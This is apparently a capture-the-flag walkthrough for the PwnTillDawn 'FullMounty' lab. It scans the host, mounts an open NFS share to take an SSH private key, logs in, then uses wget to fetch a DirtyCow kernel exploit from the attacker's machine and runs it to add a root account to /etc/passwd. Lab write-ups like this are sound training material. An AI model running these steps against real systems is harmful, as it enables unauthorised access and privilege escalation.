---
categories: [PwnTillDawn , Walkthrough]
tags: [Kernel Exploit, DirtyCow, NFS]
image:
  path: /Vulnhub-Files/img/FullMounty/Untitled.png
  alt: Chilakiller -> https://www.wizlynxgroup.com/ , https://online.pwntilldawn.com/
---


## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/PwnTillDawn/10.150.150.134]
└─$ cat Nmap_results.txt 
# Nmap 7.94 scan initiated Sun Aug 20 22:14:12 2023 as: nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.150.150.134
Nmap scan report for 10.150.150.134
Host is up (0.15s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 5.3p1 Debian 3ubuntu7.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 f6:e9:3f:cf:88:ec:7c:35:63:91:34:aa:14:55:49:cc (DSA)
|_  2048 20:1d:e9:90:6f:4b:82:a3:71:1e:a9:99:95:7f:31:ea (RSA)
111/tcp   open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/udp   nfs
|   100005  1,2,3      34154/tcp   mountd
|   100005  1,2,3      50354/udp   mountd
|   100021  1,3,4      45783/tcp   nlockmgr
|   100021  1,3,4      48262/udp   nlockmgr
|   100024  1          38840/udp   status
|_  100024  1          40110/tcp   status
2049/tcp  open  nfs      2-4 (RPC #100003)
8089/tcp  open  ssl/http Splunkd httpd
|_http-title: splunkd
| http-robots.txt: 1 disallowed entry 
|_/
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2019-10-28T09:51:59
|_Not valid after:  2022-10-27T09:51:59
|_http-server-header: Splunkd
34154/tcp open  mountd   1-3 (RPC #100005)
40110/tcp open  status   1 (RPC #100024)
45783/tcp open  nlockmgr 1-4 (RPC #100021)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## NFS Shares Enumeration ⤵️

Now I have access to nfs so lets see its shared shares through `showmount` command →

```bash
┌──(kali㉿kali)-[~/Downloads/PwnTillDawn/10.150.150.134]
└─$ showmount -e 10.150.150.134
Export list for 10.150.150.134:
/srv/exportnfs 10.0.0.0/8
```

Now lets mount this directory in out local system through `mount` command ⤵️ 

```bash
┌──(kali㉿kali)-[~/Downloads/PwnTillDawn/10.150.150.134]
└─$ mkdir /tmp/nfs
                                                                                                                                
┌──(kali㉿kali)-[~/Downloads/PwnTillDawn/10.150.150.134]
└─$ sudo mount -v -t nfs -o vers=3,proto=tcp,nolock 10.150.150.134:/srv/exportnfs /tmp/nfs
[sudo] password for kali: 
mount.nfs: timeout set for Mon Sep 18 22:25:38 2023
mount.nfs: trying text-based options 'vers=3,proto=tcp,nolock,addr=10.150.150.134'
mount.nfs: prog 100003, trying vers=3, prot=6
mount.nfs: trying 10.150.150.134 prog 100003 vers 3 prot TCP port 2049
mount.nfs: prog 100005, trying vers=3, prot=6
mount.nfs: trying 10.150.150.134 prog 100005 vers 3 prot TCP port 34154
```

Now lets check if it gets mounted or not with `df` command →

![Untitled](/Vulnhub-Files/img/FullMounty/Untitled%201.png)

Now lets see inside this shares →

```bash
┌──(kali㉿kali)-[~/Downloads/PwnTillDawn/10.150.150.134]
└─$ cd /tmp/nfs         
                                                                                                                                
┌──(kali㉿kali)-[/tmp/nfs]
└─$ ls -al
total 36
drwxr-xr-x  5 nobody nogroup 4096 Oct 29  2019 .
drwxrwxrwt 27 root   root    4096 Sep 18 22:23 ..
-rw-------  1 nobody nogroup  667 Oct 29  2019 .bash_history
drwxr-xr-x  5 nobody nogroup 4096 Oct 29  2019 .config
-rw-r--r--  1 kali   kali      41 Oct 22  2019 FLAG49
-rw-r--r--  1 kali   kali    1675 Oct  3  2019 id_rsa
-rw-r--r--  1 kali   kali     397 Oct  3  2019 id_rsa.pub
drwxr-xr-x  3 nobody nogroup 4096 Oct 29  2019 .local
drwxr-xr-x  3 nobody nogroup 4096 Oct 29  2019 .mozilla
                                                                                                                                
┌──(kali㉿kali)-[/tmp/nfs]
└─$ cat FLAG49             
41b779ac4c999468ba7f862cde86412096d1c37b
```

Now I got the id_rsa private key so lets try to SSH into the system →

```bash
┌──(kali㉿kali)-[~/Downloads/PwnTillDawn/10.150.150.134]
└─$ ssh deadbeef@10.150.150.134 -i id_rsa
Linux FullMounty 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux
Ubuntu 10.04.4 LTS

Welcome to Ubuntu!
 * Documentation:  https://help.ubuntu.com/
New release 'precise' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Wed Aug 12 00:50:59 2020
deadbeef@FullMounty:~$ whoami
deadbeef
deadbeef@FullMounty:~$ id
uid=1000(deadbeef) gid=1000(deadbeef) groups=4(adm),20(dialout),24(cdrom),46(plugdev),107(lpadmin),108(sambashare),109(admin),1000(deadbeef)
deadbeef@FullMounty:~$
```

Now lets dig deeper into the shell for root access , and for that I directly checked the kernel version so I got this →

```bash
deadbeef@FullMounty:/$ uname -an
Linux FullMounty 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux
deadbeef@FullMounty:/$
```

Since it is very old Linux machine so lets use the exploit named as dirtycow over here I have the pre-compiled file of it for both architecture of machine x32 and x64 so lets use  x32 over here ⤵️ 

```bash
deadbeef@FullMounty:/tmp$ wget http://10.66.66.178:2323/exploit_32
--2023-09-18 11:18:01--  http://10.66.66.178:2323/exploit_32
Connecting to 10.66.66.178:2323... connected.
HTTP request sent, awaiting response... 200 OK
Length: 12768 (12K) [application/octet-stream]
Saving to: `exploit_32

100%[=====================>] 12,768      65.4K/s   in 0.2s    

2023-09-18 11:18:01 (65.4 KB/s) - `exploit_32 saved [12768/12768]

deadbeef@FullMounty:/tmp$
deadbeef@FullMounty:/tmp$ ./exploit_32
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
evait:fiw.I6FqpfXW.:0:0:pwned:/root:/bin/bash

mmap: b784b000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created
You can log in with username evait and password root.

DONT FORGET TO RESTORE /etc/passwd FROM /tmp/passwd.bak !!!

Done! Check /etc/passwd to see if the new user was created
You can log in with username evait and password root.

DONT FORGET TO RESTORE /etc/passwd FROM /tmp/passwd.bak !!!

deadbeef@FullMounty:/tmp$ su firefart
Unknown id: firefart
deadbeef@FullMounty:/tmp$ su evait
Password: 
evait@FullMounty:/tmp# whoami
evait
evait@FullMounty:/tmp#
evait@FullMounty:/tmp# cd /root
evait@FullMounty:~# id
uid=0(evait) gid=0(root) groups=0(root)
evait@FullMounty:~# ls -al
total 28
drwx------  4 evait root 4096 2019-10-03 07:34 .
drwxr-xr-x 22 evait root 4096 2019-10-03 00:10 ..
drwx------  2 evait root 4096 2019-10-03 00:10 .aptitude
-rw-------  1 evait root  150 2020-08-12 02:00 .bash_history
-rw-r--r--  1 evait root 3106 2010-04-23 02:45 .bashrc
drwxr-xr-x  2 evait root 4096 2019-10-03 00:10 .debtags
-rw-r--r--  1 evait root  140 2010-04-23 02:45 .profile
evait@FullMounty:~#
```

Now I am root !!